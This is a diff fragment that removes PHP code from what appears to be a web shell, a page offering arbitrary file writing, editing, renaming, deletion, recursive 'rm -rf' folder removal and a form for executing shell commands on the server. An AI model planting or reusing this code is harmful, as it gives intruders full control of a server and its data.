-				$filename = htmlspecialchars($_POST['filename']);
-				$fopen    = fopen($filename, "w+");
-				if ($fopen) {
-					fwrite($fopen, $_POST['content']);
-					$act = color(1, 2, "Success!") . " - <a href='?dir=" . path() . "'>Back</a>";
-				} else {
-					$act = color(1, 1, "Permission Denied!");
-				}
-			}
-			print $act;
-			if (!$_POST['save']) {
-				print "<form method='post'>
-      			<b>Filename:</b> <input type='text' name='filename' value='" . path() . "/newfile.php' style='width: 450px;' height='10'><br>
-            <b>Content:</b>
-            <textarea id='textarea1' class='materialize-textarea' name='content'></textarea>
-      			<input class='btn' type='submit' class='input' name='save' value='SUBMIT'>
-      			</form>";
-			}
-		} elseif ($_GET['act'] === 'newfolder') {
-			if ($_POST['save']) {
-				$foldername = path() . '/' . htmlspecialchars($_POST['foldername']);
-				if (!@mkdir($foldername)) {
-					$act = color(1, 1, "Permission Denied!");
-				} else {
-					$act = "<script>window.location='?dir=" . path() . "';</script>";
-				}
-			}
-			print $act;
-			print "<form method='post'>
-    			Folder Name: <input type='text' name='foldername' style='width: 450px;' height='10'>
-    			<input type='submit' class='input btn' name='save' value='SUBMIT'>
-    			</form>";
-		} elseif ($_GET['act'] === 'edit') {
-			if ($_POST['save']) {
-				$save = file_put_contents($_GET['file'], $_POST['src']);
-				if ($save) {
-					$act = color(1, 2, "File Saved!");
-				} else {
-					$act = color(1, 1, "Permission Denied!");
-				}
-				print "$act<br>";
-			}
-			print "Filename: " . color(1, 2, basename($_GET['file'])) . " [" . writeable($_GET['file'], perms($_GET['file'])) . "]<br>";
-			print "[ <a href='?act=view&dir=" . path() . "&file=" . $_GET['file'] . "'>view</a> ] [ <a href='?act=edit&dir=" . path() . "&file=" . $_GET['file'] . "'><b>edit</b></a> ] [ <a href='?act=rename&dir=" . path() . "&file=" . $_GET['file'] . "'>rename</a> ] [ <a href='?act=download&dir=" . path() . "&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=" . path() . "&file=" . $_GET['file'] . "'>delete</a> ]<br>";
-			print "<form method='post'>
-    			<textarea name='src'>" . htmlspecialchars(@file_get_contents($_GET['file'])) . "</textarea><br>
-    			<input type='submit' class='input btn' value='SAVE' name='save'>
-    			</form>";
-		} elseif ($_GET['act'] === 'view') {
-			print "Filename: " . color(1, 2, basename($_GET['file'])) . " [" . writeable($_GET['file'], perms($_GET['file'])) . "]<br>";
-			print "[ <a href='?act=view&dir=" . path() . "&file=" . $_GET['file'] . "'><b>view</b></a> ] [ <a href='?act=edit&dir=" . path() . "&file=" . $_GET['file'] . "'>edit</a> ] [ <a href='?act=rename&dir=" . path() . "&file=" . $_GET['file'] . "'>rename</a> ] [ <a href='?act=download&dir=" . path() . "&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=" . path() . "&file=" . $_GET['file'] . "'>delete</a> ]<br>";
-			print "<textarea readonly>" . htmlspecialchars(@file_get_contents($_GET['file'])) . "</textarea>";
-		} elseif ($_GET['act'] === 'rename') {
-			if ($_POST['save']) {
-				$rename = rename($_GET['file'], path() . DIRECTORY_SEPARATOR . htmlspecialchars($_POST['filename']));
-				if ($rename) {
-					$act = "<script>window.location='?dir=" . path() . "';</script>";
-				} else {
-					$act = color(1, 1, "Permission Denied!");
-				}
-				print "$act<br>";
-			}
-			print "Filename: " . color(1, 2, basename($_GET['file'])) . " [" . writeable($_GET['file'], perms($_GET['file'])) . "]<br>";
-			print "[ <a href='?act=view&dir=" . path() . "&file=" . $_GET['file'] . "'>view</a> ] [ <a href='?act=edit&dir=" . path() . "&file=" . $_GET['file'] . "'>edit</a> ] [ <a href='?act=rename&dir=" . path() . "&file=" . $_GET['file'] . "'><b>rename</b></a> ] [ <a href='?act=download&dir=" . path() . "&file=" . $_GET['file'] . "'>download</a> ] [ <a href='?act=delete&dir=" . path() . "&file=" . $_GET['file'] . "'>delete</a> ]<br>";
-			print "<form method='post'>
-    			<input type='text' value='" . basename($_GET['file']) . "' name='filename' style='width: 450px;' height='10'>
-    			<input type='submit' class='input btn' name='save' value='RENAME'>
-    			</form>";
-		} elseif ($_GET['act'] === 'rename_folder') {
-			if ($_POST['save']) {
-				$rename_folder = rename(path(), "" . dirname(path()) . DIRECTORY_SEPARATOR . htmlspecialchars($_POST['foldername']));
-				if ($rename_folder) {
-					$act = "<script>window.location='?dir=" . dirname(path()) . "';</script>";
-				} else {
-					$act = color(1, 1, "Permission Denied!");
-				}
-				print "$act<br>";
-			}
-			print "<form method='post'>
-          <b>Folder Name: </b>
-    			<input type='text' value='" . basename(path()) . "' name='foldername' style='width: 450px;' height='10'>
-    			<input type='submit' class='input btn' name='save' value='RENAME'>
-    			</form>";
-		} elseif ($_GET['act'] === 'delete') {
-			$delete = unlink($_GET['file']);
-			if ($delete) {
-				$act = "<script>window.location='?dir=" . path() . "';</script>";
-			} else {
-				$act = color(1, 1, "Permission Denied!");
-			}
-			print $act;
-		} elseif ($_GET['act'] === 'delete_folder') {
-			if (is_dir(path())) {
-				if (is_writable(path())) {
-					@rmdir(path());
-					if (!@rmdir(path()) and OS() === "Linux") @exe("rm -rf " . path());
-					if (!@rmdir(path()) and OS() === "Windows") @exe("rmdir /s /q " . path());
-					$act = "<script>window.location='?dir=" . dirname(path()) . "';</script>";
-				} else {
-					$act = color(1, 1, "Could not remove directory '" . basename(path()) . "'");
-				}
-			}
-			print $act;
-		} elseif ($_GET['act'] == 'cmd') {
-			print "<form method='post' action='?do=cmd&dir=" . path() . "' style='margin-top: 15px;'>
-  			  " . usergroup()->name . "@" . $GLOBALS['SERVERIP'] . ": ~ $
-  			  <input type='text' name='cmd' style='width: 450px;' height='10' required>
-  			  <input style='border: none; border-bottom: 1px solid #ffffff;' class='input btn' type='submit' value='Execute'>
-			    </form>";
-		}
-	} else {
-		indexing();
-	}
-}
-?>
